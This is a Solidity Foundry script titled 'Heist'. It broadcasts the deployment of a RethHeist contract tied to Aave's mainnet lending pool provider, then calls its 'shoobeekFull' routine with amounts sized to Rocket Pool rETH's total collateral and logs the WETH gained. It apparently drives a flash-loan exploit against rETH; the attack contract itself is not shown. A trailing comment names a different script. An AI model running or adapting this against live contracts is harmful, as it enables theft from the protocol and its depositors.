// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import "forge-std/Script.sol";
import "forge-std/StdJson.sol";
import "forge-std/Test.sol";

import "../src/RethHeist.sol";
import {RocketTokenRETHInterface as IRETH} from "@rocketpool/contracts/interfaces/token/RocketTokenRETHInterface.sol";

contract Heist is
    Script, Test
{
    Vm cheats = Vm(HEVM_ADDRESS);
    IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IRETH private constant rETH = IRETH(0xae78736Cd615f374D3085123A210448E74Fc6393);
    // RocketNodeManagerInterface nodeManager = RocketNodeManagerInterface(0x67CdE7AF920682A29fcfea1A179ef0f30F48Df3e);
    // RocketNodeDepositInterface nodeDeposit = RocketNodeDepositInterface(0x1Cc9cF5586522c6F483E84A19c3C2B0B6d027bF0);
    // RocketMinipoolManagerInterface minipoolManager = RocketMinipoolManagerInterface(0x84D11B65E026F7aA08F5497dd3593fb083410B71);

    //performs basic deployment before each test
    function run() external {
        emit log_uint(address(msg.sender).balance);
        vm.broadcast();
        RethHeist rh = new RethHeist(ILendingPoolAddressesProvider(0xB53C1a33016B2DC2fF3653530bfF1848a515c8c5));
        uint256 amountWeth = rETH.getTotalCollateral(); // this is an overestimate
        uint256 amountReth = rETH.getRethValue(rETH.getTotalCollateral());
        emit log_uint(address(msg.sender).balance);
        vm.broadcast();
        rh.shoobeekFull(amountWeth, amountReth);
        emit log_uint(WETH.balanceOf(address(rh)));
    }
}

//forge script script/SlashRPL.s.sol:SlashRPL --rpc-url $RPC_URL -vvvv